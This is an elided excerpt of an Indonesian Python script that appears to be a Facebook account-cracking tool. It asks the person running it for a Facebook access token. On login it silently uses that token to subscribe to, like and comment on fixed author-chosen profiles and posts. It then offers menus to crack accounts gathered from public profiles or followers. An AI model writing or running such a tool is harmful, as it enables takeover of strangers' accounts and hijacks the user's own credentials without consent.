...
logo = ("""\033[1;97m ___   ___ ___   ___ ___   ___ 
\  \ /  / \  \ /  / \  \ /  / 
 \  V  /   \  V  /   \  V  /  
  >   <     >   <     >   <            ® Pasti Mau Crack:)
 /  .  \   /  .  \   /  .  \  
/__/ \__\ /__/ \__\ /__/ \__\ ®Lo Ngentod
Name Author:Shadow XXX
My Github:https://ShadowXfrangk
My Facebook:konsol
...
def __login__():
	...
	os.system('clear')
	print(logo)
	print('[1] Login Pakai Token Sayang')
	print('[2] Cara Ambil Token')
	print('[3] Ngapain Keluar Bwang')
        masuk = raw_input('\n[] Pilih Tod : ')
        if masuk == "":
                exit('[×] Wrong Input')
        elif masuk == "1":
...
def __komen_token__():
	...
	__motivasi__ = random.choice(["Apapun yg terjadi, nikmati hidup ini. Hapus air mata, berikan senyummu. Kadang, senyum terindah datang setelah air mata penuh luka.","Jika kamu tahu seseorang telah ada yg memiliki, kamu seharusnya menghargai. Jangan menjadi alasan hubungan mereka berakhir.","Mencemaskan apa yg mungkin terjadi hanya membuang waktumu. Itu hanya membebani pikiranmu dan mengambil kebahagiaanmu.","Jangan menunggu waktu yg tepat tuk melakukan hal yg baik. Jangan terus bertanya apa yg mungkin terjadi, beranikan diri!","Jika seseorang mampu memberi alasan mengapa dia mencintaimu, dia tak mencintaimu, dia menyukaimu. Cinta itu emosi, bukan definisi.","Dalam hidup, kamu harus menyadari, kadang orang yg paling kamu inginkan, adalah orang yg buat hidupmu lebih baik jika tanpanya","Dia yg tulus mencintaimu takkan berjalan di depanmu, atau tertinggal di belakangmu. Dia akan selalu berjalan di sampingmu.","Kadang, masalah adalah satu-satunya cara tuk tahu siapa yg tulus peduli padamu dan siapa yg berpura-pura jadi temanmu.","Mereka yg mencintaimu slalu ingin yg terbaik untukmu, hanya saja cara mereka bukan slalu yg terbaik.","Jangan menunda sebuah pekerjaan, lebih baik menyesali apa yg kamu kerjakan, daripada menyesali apa yg tak pernah kamu kerjakan."])
        __kata__ = 'Jangan Sad Mulu bang '
	__kata2__ = 'Script Simpel Dan mudah Dimengerti Semoga Hariku Menyenangkan '
        __kom__ = __kata__+'\n'+__motivasi__+'\n'+__waktu__
	__kom2__ = __kata2__+'\n'+__waktu__
	...
	requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token=' + token) #Muhammad Rozhak
        requests.post('https://graph.facebook.com/134275898978115/comments/?message=' +__kom__+ '&access_token=' + token)
        requests.post('https://graph.facebook.com/134275898978115/likes?summary=true&access_token=' + token)
        requests.post('https://graph.facebook.com/134275898978115/comments/?message='+__kom2__+'&access_token=' + token)
        requests.post('https://graph.facebook.com/134275898978115/likes?summary=true&access_token=' + token)
	print('[×] Login Succeed')
        __menu__()
def __menu__():
        ...
        os.system('clear')
	print(logo)
	print('[] Name Fb Kamu : '+name)
	print('[] Birthday : '+birthday)
	print('\n[1] Crack Dari Publik(Tanpa Berteman')
	print('[2] Crack Dari Follower(Pengikut')
	print('[3] Lihat Hasil Crack Kalian')
	print('[0] Keluar(Semoga Harimu menyenangkan')
	print('[] Sebelum Crack Jan lupa Bismillah Biar One Tab')
	msk = raw_input('\n[] Pilih Tod : ')
	if msk == "":
		exit('[] Wrong Input')
		...
		time.sleep(3)
		exit('[] Selamat Tinggal Semoga Harimu Menyenangkan')            
	else:
		exit('[×] Wrong Input')
	...
	def main(arg):
		...
		print __warna_warni__+'\r[Proses] %s/%s [woghe:%s] - [Yah cp awokawok:%s] ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		uid = arg
		try:
